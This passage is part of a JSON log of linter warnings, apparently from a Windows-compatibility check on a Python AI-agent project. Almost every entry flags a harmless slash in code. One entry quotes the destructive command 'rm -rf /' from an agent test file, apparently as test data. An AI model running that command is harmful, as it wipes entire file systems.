        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 116: Forward slash in path - \"tests/integration\"",
        "timestamp": "2025-09-05T17:30:42.197894"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 117: Forward slash in path - \"tests/performance\"",
        "timestamp": "2025-09-05T17:30:42.197903"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 118: Forward slash in path - \"tests/security\"",
        "timestamp": "2025-09-05T17:30:42.197914"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 119: Forward slash in path - \"tests/error_handling\"",
        "timestamp": "2025-09-05T17:30:42.197926"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 152: Forward slash in path - \"\n        discovered_tests = {test_type: [] for test_type in TestType}\n        \n        for test_type, directory in self.config.test_directories.items():\n            test_dir = project_root / directory\n            \n            if not test_dir.exists():\n                logger.warning(f\"",
        "timestamp": "2025-09-05T17:30:42.197969"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 293: Forward slash in path - \"\n        coverage_file = project_root / f\"",
        "timestamp": "2025-09-05T17:30:42.198076"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 306: Forward slash in path - \"\n        perf_file = project_root / \"",
        "timestamp": "2025-09-05T17:30:42.198106"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 369: Forward slash in path - \"{test_type.value} tests completed: {passed_tests}/{len(valid_results)} passed in {total_duration:.2f}s\"",
        "timestamp": "2025-09-05T17:30:42.198182"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 387: Forward slash in path - ', 0)\n        \n        if total_lines == 0:\n            return 0.0\n        \n        return (covered_lines / total_lines) * 100\n\n\nclass QualityGateEvaluator:\n    \"",
        "timestamp": "2025-09-05T17:30:42.198227"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 446: Forward slash in path - \":\n            # Average coverage across all suites\n            coverages = [suite.coverage_percentage for suite in suite_results]\n            return sum(coverages) / len(coverages) if coverages else 0.0\n            \n        elif metric == \"",
        "timestamp": "2025-09-05T17:30:42.198302"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 451: Forward slash in path - \":\n            # Overall success rate\n            total_tests = sum(suite.total_tests for suite in suite_results)\n            passed_tests = sum(suite.passed_tests for suite in suite_results)\n            return (passed_tests / total_tests * 100) if total_tests > 0 else 0.0\n            \n        elif metric == \"",
        "timestamp": "2025-09-05T17:30:42.198339"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 461: Forward slash in path - \":\n            # Tests per second\n            total_tests = sum(suite.total_tests for suite in suite_results)\n            total_duration = sum(suite.total_duration for suite in suite_results)\n            return total_tests / total_duration if total_duration > 0 else 0.0\n            \n        elif metric == \"",
        "timestamp": "2025-09-05T17:30:42.198375"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 480: Forward slash in path - \" in suite.suite_name:\n                    recovery_tests.extend(suite.test_results)\n            \n            if not recovery_tests:\n                return 100.0  # No recovery tests, assume success\n            \n            passed_recovery = sum(1 for test in recovery_tests if test.status == TestStatus.PASSED)\n            return (passed_recovery / len(recovery_tests) * 100) if recovery_tests else 100.0\n        \n        else:\n            raise ValueError(f\"",
        "timestamp": "2025-09-05T17:30:42.198426"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 519: Forward slash in path - \"\n        \n        # Calculate summary statistics\n        total_tests = sum(suite.total_tests for suite in suite_results)\n        total_passed = sum(suite.passed_tests for suite in suite_results)\n        total_failed = sum(suite.failed_tests for suite in suite_results)\n        total_errors = sum(suite.error_tests for suite in suite_results)\n        total_duration = sum(suite.total_duration for suite in suite_results)\n        avg_coverage = sum(suite.coverage_percentage for suite in suite_results) / len(suite_results) if suite_results else 0\n        \n        report_lines = [\n            \"",
        "timestamp": "2025-09-05T17:30:42.198488"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 534: Forward slash in path - \"Total Execution Time: {total_duration:.2f} seconds ({total_duration/60:.1f} minutes)\"",
        "timestamp": "2025-09-05T17:30:42.198527"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 539: Forward slash in path - \"Tests Passed: {total_passed} ({total_passed/total_tests*100:.1f}%)\"",
        "timestamp": "2025-09-05T17:30:42.198563"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 540: Forward slash in path - \"Tests Failed: {total_failed} ({total_failed/total_tests*100:.1f}%)\"",
        "timestamp": "2025-09-05T17:30:42.198588"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 541: Forward slash in path - \"Tests with Errors: {total_errors} ({total_errors/total_tests*100:.1f}%)\"",
        "timestamp": "2025-09-05T17:30:42.198611"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 550: Forward slash in path - \" * 25\n        ])\n        \n        for suite in suite_results:\n            success_rate = (suite.passed_tests / suite.total_tests * 100) if suite.total_tests > 0 else 0\n            report_lines.extend([\n                f\"",
        "timestamp": "2025-09-05T17:30:42.198640"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 586: Forward slash in path - \"Test Throughput: {total_tests/total_duration:.2f} tests/second\"",
        "timestamp": "2025-09-05T17:30:42.198677"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 586: Forward slash in path - \"Test Throughput: N/A\"",
        "timestamp": "2025-09-05T17:30:42.198696"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 587: Forward slash in path - \"Average Test Duration: {total_duration/total_tests:.3f} seconds\"",
        "timestamp": "2025-09-05T17:30:42.198715"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 587: Forward slash in path - \"Average Test Duration: N/A\"",
        "timestamp": "2025-09-05T17:30:42.198735"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 638: Forward slash in path - \"\n        recommendations = []\n        \n        # Coverage recommendations\n        avg_coverage = sum(suite.coverage_percentage for suite in suite_results) / len(suite_results) if suite_results else 0\n        if avg_coverage < 90:\n            recommendations.append(f\"",
        "timestamp": "2025-09-05T17:30:42.198782"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 649: Forward slash in path - \"Optimize test execution time (currently {total_duration/60:.1f} minutes)\"",
        "timestamp": "2025-09-05T17:30:42.198808"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 654: Forward slash in path - \"Fix {total_failed} failing/error tests before production deployment\"",
        "timestamp": "2025-09-05T17:30:42.198830"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 679: Forward slash in path - ')\n        reports_dir = project_root / '",
        "timestamp": "2025-09-05T17:30:42.198869"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 680: Forward slash in path - '\n        reports_dir.mkdir(exist_ok=True)\n        \n        # Comprehensive text report\n        text_report = self.generate_comprehensive_report(suite_results, quality_gate_results)\n        with open(reports_dir / f'",
        "timestamp": "2025-09-05T17:30:42.198891"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 685: Forward slash in path - ') as f:\n            f.write(text_report)\n        \n        # JSON report for CI/CD integration\n        json_report = {\n            '",
        "timestamp": "2025-09-05T17:30:42.198914"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 697: Forward slash in path - ': sum(suite.coverage_percentage for suite in suite_results) / len(suite_results) if suite_results else 0\n            },\n            '",
        "timestamp": "2025-09-05T17:30:42.198961"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 700: Forward slash in path - ': quality_gate_results\n        }\n        \n        with open(reports_dir / f'",
        "timestamp": "2025-09-05T17:30:42.198985"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 703: Forward slash in path - ') as f:\n            json.dump(json_report, f, indent=2, default=str)\n        \n        # JUnit XML for CI/CD systems\n        self._generate_junit_xml(suite_results, reports_dir / f'",
        "timestamp": "2025-09-05T17:30:42.199008"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 879: Forward slash in path - \")\n            \n        else:\n            # Run all tests\n            suite_results, quality_gate_results = await runner.run_all_tests()\n            \n            # Print summary\n            report = runner.report_generator.generate_comprehensive_report(suite_results, quality_gate_results)\n            print(report)\n            \n            # Exit code for CI/CD\n            if not quality_gate_results['",
        "timestamp": "2025-09-05T17:30:42.199133"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "warning": "Line 67: Forward slash in path - 'rm -rf /'",
        "timestamp": "2025-09-05T17:30:42.199519"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tools\\tool_framework.py",
        "warning": "Line 100: Forward slash in path - \"\n        if self.execution_count == 0:\n            return 0.0\n        return self.success_count / self.execution_count\n    \n    def get_average_latency(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.200171"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tools\\tool_framework.py",
        "warning": "Line 106: Forward slash in path - \"\n        if self.execution_count == 0:\n            return 0.0\n        return self.total_latency / self.execution_count\n\n\nclass ToolRegistry:\n    \"",
        "timestamp": "2025-09-05T17:30:42.200185"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tools\\tool_framework.py",
        "warning": "Line 297: Forward slash in path - \"docs/api.md\"",
        "timestamp": "2025-09-05T17:30:42.200316"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tools\\tool_framework.py",
        "warning": "Line 380: Forward slash in path - \"Adapts external functions/libraries to work as tools\"",
        "timestamp": "2025-09-05T17:30:42.200379"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\distributed_memory.py",
        "warning": "Line 1: Forward slash in path - \"\nDistributed Memory Manager\nManages memory across multiple nodes/processes\n\"",
        "timestamp": "2025-09-05T17:30:42.201021"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\memory_consolidator.py",
        "warning": "Line 66: Forward slash in path - \": sum(m.relevance_score for m in memories) / len(memories)\n        }\n        \n        # Combine tags\n        all_tags = []\n        for memory in memories:\n            all_tags.extend(memory.tags)\n        unique_tags = list(set(all_tags))\n        \n        return MemoryEntry(\n            id=f\"",
        "timestamp": "2025-09-05T17:30:42.201364"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\pattern_extractor.py",
        "warning": "Line 49: Forward slash in path - \": sum(m.relevance_score for m in memories) / len(memories)\n        }\n    \n    async def find_trending_patterns(self, memories: List[MemoryEntry], time_window_hours: int = 24) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.201660"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\semantic_search.py",
        "warning": "Line 37: Forward slash in path - ') for word in words if len(word) > 2]\n            \n            # Create embedding vector\n            embedding = np.zeros(self.embedding_dim)\n            \n            # Simple bag-of-words with position weighting\n            for i, word in enumerate(words):\n                # Add word to vocabulary if new\n                if word not in self.vocabulary:\n                    self.vocabulary[word] = self.word_index\n                    self.word_index += 1\n                \n                # Get word index and add to embedding\n                word_idx = self.vocabulary[word] % self.embedding_dim\n                \n                # Weight by inverse position (earlier words matter more)\n                position_weight = 1.0 / (i + 1)\n                embedding[word_idx] += position_weight\n                \n                # Add some randomness for better distribution\n                if len(words) > 1:\n                    neighbor_idx = (word_idx + 1) % self.embedding_dim\n                    embedding[neighbor_idx] += position_weight * 0.3\n            \n            # Normalize the embedding\n            if np.linalg.norm(embedding) > 0:\n                embedding = embedding / np.linalg.norm(embedding)\n            \n            return embedding\n            \n        except Exception as e:\n            logger.error(f\"",
        "timestamp": "2025-09-05T17:30:42.201968"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\semantic_search.py",
        "warning": "Line 68: Forward slash in path - \")\n            # Return random normalized vector as fallback\n            embedding = np.random.random(self.embedding_dim)\n            return embedding / np.linalg.norm(embedding)\n    \n    async def calculate_similarity(self, embedding1: np.ndarray, embedding2: np.ndarray) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.201980"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\semantic_search.py",
        "warning": "Line 74: Forward slash in path - \"\n        try:\n            # Ensure vectors are normalized\n            norm1 = np.linalg.norm(embedding1)\n            norm2 = np.linalg.norm(embedding2)\n            \n            if norm1 == 0 or norm2 == 0:\n                return 0.0\n            \n            # Cosine similarity\n            similarity = np.dot(embedding1, embedding2) / (norm1 * norm2)\n            \n            # Ensure similarity is between 0 and 1\n            return max(0.0, min(1.0, (similarity + 1.0) / 2.0))\n            \n        except Exception as e:\n            logger.error(f\"",
        "timestamp": "2025-09-05T17:30:42.201992"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "warning": "Line 138: Forward slash in path - \")\n        \n        # Create FAISS index\n        self.faiss_index = faiss.IndexFlatIP(self.embedding_dimension)  # Inner product (cosine similarity)\n        self.faiss_id_map: Dict[int, str] = {}\n        self.faiss_metadata: Dict[str, MemoryEntry] = {}\n        \n        # Try to load existing index\n        index_path = self.storage_path / \"",
        "timestamp": "2025-09-05T17:30:42.202411"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "warning": "Line 146: Forward slash in path - \"\n        metadata_path = self.storage_path / \"",
        "timestamp": "2025-09-05T17:30:42.202421"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "warning": "Line 161: Forward slash in path - \"\n        self.sqlite_path = self.storage_path / \"",
        "timestamp": "2025-09-05T17:30:42.202436"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "warning": "Line 344: Forward slash in path - \"\n        # Check cache first\n        text_hash = hashlib.md5(text.encode()).hexdigest()\n        if text_hash in self._embedding_cache:\n            self.cache_hits += 1\n            return self._embedding_cache[text_hash]\n        \n        # Simple embedding generation (in production, use proper models)\n        # This is a placeholder - replace with actual embedding model\n        words = text.lower().split()\n        \n        # Create simple TF-IDF-like embedding\n        embedding = np.zeros(self.embedding_dimension)\n        \n        for i, word in enumerate(words[:self.embedding_dimension]):\n            # Simple hash-based embedding\n            word_hash = hash(word) % self.embedding_dimension\n            embedding[word_hash] += 1.0 / (i + 1)  # Position weighting\n        \n        # Normalize\n        norm = np.linalg.norm(embedding)\n        if norm > 0:\n            embedding = embedding / norm\n        \n        # Cache result\n        if len(self._embedding_cache) < self._cache_max_size:\n            self._embedding_cache[text_hash] = embedding\n        \n        return embedding\n    \n    # ChromaDB implementation methods\n    async def _store_chromadb(self, memory: MemoryEntry) -> None:\n        \"",
        "timestamp": "2025-09-05T17:30:42.202546"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "warning": "Line 490: Forward slash in path - \"\n        try:\n            index_path = self.storage_path / \"",
        "timestamp": "2025-09-05T17:30:42.202617"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "warning": "Line 492: Forward slash in path - \"\n            metadata_path = self.storage_path / \"",
        "timestamp": "2025-09-05T17:30:42.202630"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "warning": "Line 715: Forward slash in path - \")\n            return False\n    \n    # Placeholder methods for ChromaDB recent/frequent queries\n    async def _get_recent_chromadb(self, limit: int) -> List[MemoryEntry]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.202753"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "warning": "Line 756: Forward slash in path - ': self.cache_hits / max(self.total_searches, 1),\n            '",
        "timestamp": "2025-09-05T17:30:42.202788"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\observability\\metrics.py",
        "warning": "Line 75: Forward slash in path - \": sum(timings) / len(timings),\n                    \"",
        "timestamp": "2025-09-05T17:30:42.203616"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\observability\\metrics.py",
        "warning": "Line 101: Forward slash in path - \": sum(timings) / len(timings),\n                    \"",
        "timestamp": "2025-09-05T17:30:42.203636"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 248: Forward slash in path - '] / len(test_tasks) if test_tasks else 0\n        \n        return test_data\n    \n    def _is_successful_result(self, result: Any) -> bool:\n        \"",
        "timestamp": "2025-09-05T17:30:42.204866"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 294: Forward slash in path - \"\n            )\n        \n        avg_response_time = sum(response_times) / len(response_times)\n        max_response_time = max(response_times)\n        \n        # Check against max value constraint\n        if constraint.max_value is not None:\n            passed = avg_response_time <= constraint.max_value * (1 + constraint.tolerance)\n            deviation = abs(avg_response_time - constraint.max_value) / constraint.max_value\n            \n            return BehaviorTestResult(\n                test_name=f\"",
        "timestamp": "2025-09-05T17:30:42.204906"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 347: Forward slash in path - \"\n            )\n        \n        if constraint.min_value is not None:\n            passed = success_rate >= constraint.min_value * (1 - constraint.tolerance)\n            deviation = abs(success_rate - constraint.min_value) / constraint.min_value if constraint.min_value > 0 else 0\n            \n            return BehaviorTestResult(\n                test_name=f\"",
        "timestamp": "2025-09-05T17:30:42.204941"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 399: Forward slash in path - ', 0) for r in resource_usage) / len(resource_usage)\n        avg_memory = sum(r.get('",
        "timestamp": "2025-09-05T17:30:42.204987"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 400: Forward slash in path - ', 0) for r in resource_usage) / len(resource_usage)\n        \n        # For simplicity, use CPU time as the primary metric\n        actual_value = avg_cpu\n        \n        if constraint.max_value is not None:\n            passed = actual_value <= constraint.max_value * (1 + constraint.tolerance)\n            deviation = abs(actual_value - constraint.max_value) / constraint.max_value\n            \n            return BehaviorTestResult(\n                test_name=f\"",
        "timestamp": "2025-09-05T17:30:42.205004"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 451: Forward slash in path - ')\n            found_expected = sum(1 for pattern in expected_transitions \n                               if pattern.strip() in transition_counts)\n            \n            actual_value = found_expected / len(expected_transitions) if expected_transitions else 0\n            expected_value = 1.0  # Expect all patterns to be found\n            \n            passed = actual_value >= (1.0 - constraint.tolerance)\n            deviation = abs(actual_value - expected_value)\n            \n            return BehaviorTestResult(\n                test_name=f\"",
        "timestamp": "2025-09-05T17:30:42.205045"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 472: Forward slash in path - ': len(state_transitions)\n                }\n            )\n        \n        # Default validation - check for reasonable transition diversity\n        unique_transitions = len(transition_counts)\n        total_transitions = len(state_transitions)\n        \n        diversity_ratio = unique_transitions / max(total_transitions, 1)\n        \n        return BehaviorTestResult(\n            test_name=f\"",
        "timestamp": "2025-09-05T17:30:42.205068"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 513: Forward slash in path - \"\n            )\n        \n        # Check if results match expected format\n        valid_format_count = 0\n        \n        for result in task_results:\n            if result is None:\n                continue\n            \n            if constraint.validation_function:\n                # Use custom validation function\n                if constraint.validation_function(result):\n                    valid_format_count += 1\n            elif constraint.expected_pattern:\n                # Simple type/pattern checking\n                if constraint.expected_pattern == \"",
        "timestamp": "2025-09-05T17:30:42.205103"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 533: Forward slash in path - \" and isinstance(result, list):\n                    valid_format_count += 1\n            else:\n                # Default - any non-None result is valid\n                valid_format_count += 1\n        \n        valid_format_ratio = valid_format_count / len(task_results)\n        expected_ratio = 1.0\n        \n        passed = valid_format_ratio >= (1.0 - constraint.tolerance)\n        deviation = abs(valid_format_ratio - expected_ratio)\n        \n        return BehaviorTestResult(\n            test_name=f\"",
        "timestamp": "2025-09-05T17:30:42.205126"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 580: Forward slash in path - \"\n            )\n        \n        # Check if agent is still in a valid state after failures\n        current_state = agent.state\n        is_stable = current_state not in [AgentState.ERROR]\n        \n        # Calculate error recovery rate (simplified)\n        error_recovery_rate = 1.0 - (failure_count / total_tasks) if total_tasks > 0 else 1.0\n        \n        passed = is_stable and error_recovery_rate >= (constraint.min_value or 0.5)\n        \n        return BehaviorTestResult(\n            test_name=f\"",
        "timestamp": "2025-09-05T17:30:42.205165"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 616: Forward slash in path - 's historical performance\n        historical_success_rate = agent.get_success_rate()\n        \n        # Calculate improvement (current test vs historical)\n        if historical_success_rate > 0:\n            improvement_rate = (current_success_rate - historical_success_rate) / historical_success_rate\n        else:\n            improvement_rate = current_success_rate  # First time, use absolute performance\n        \n        min_improvement = constraint.min_value or 0.0\n        passed = improvement_rate >= min_improvement - constraint.tolerance\n        \n        return BehaviorTestResult(\n            test_name=f\"",
        "timestamp": "2025-09-05T17:30:42.205203"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 701: Forward slash in path - \",\n                        max_value=30.0  # 30 second default\n                    ),\n                    actual_value=response_time,\n                    expected_value=30.0,\n                    passed=success and response_time <= 30.0,\n                    deviation=max(0, response_time - 30.0) / 30.0,\n                    additional_data={\n                        '",
        "timestamp": "2025-09-05T17:30:42.205265"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "warning": "Line 770: Forward slash in path - ': passed_tests / total_tests if total_tests > 0 else 0,\n            '",
        "timestamp": "2025-09-05T17:30:42.205316"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\performance_benchmarks.py",
        "warning": "Line 102: Forward slash in path - \"\n        \n        class BenchmarkTestAgent(BaseAgent):\n            async def execute(self, task: Any, action) -> Any:\n                # Simulate varying amounts of work\n                work_intensity = hash(str(task)) % 10 / 10.0\n                await asyncio.sleep(work_intensity * 0.1)  # 0-100ms work\n                \n                return {\n                    \"",
        "timestamp": "2025-09-05T17:30:42.205700"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\performance_benchmarks.py",
        "warning": "Line 125: Forward slash in path - \": process.memory_info().rss / 1024 / 1024,\n            \"",
        "timestamp": "2025-09-05T17:30:42.205716"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\performance_benchmarks.py",
        "warning": "Line 246: Forward slash in path - \")\n                        return False\n            \n            # Execute all operations concurrently\n            tasks = [limited_operation(i) for i in range(config.iterations)]\n            results = await asyncio.gather(*tasks, return_exceptions=True)\n            \n            successful_operations = sum(1 for r in results if r is True)\n            errors = config.iterations - successful_operations\n        \n        # Calculate metrics\n        end_time = time.time()\n        duration = end_time - start_time\n        throughput = successful_operations / duration if duration > 0 else 0.0\n        success_rate = successful_operations / config.iterations if config.iterations > 0 else 0.0\n        \n        # Resource usage\n        final_memory = self._get_memory_usage()\n        final_cpu = psutil.cpu_percent()\n        \n        memory_usage = {\n            \"",
        "timestamp": "2025-09-05T17:30:42.205800"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\performance_benchmarks.py",
        "warning": "Line 277: Forward slash in path - \": duration / config.iterations if config.iterations > 0 else 0\n        }\n        \n        # Component-specific metrics\n        if hasattr(self, f\"",
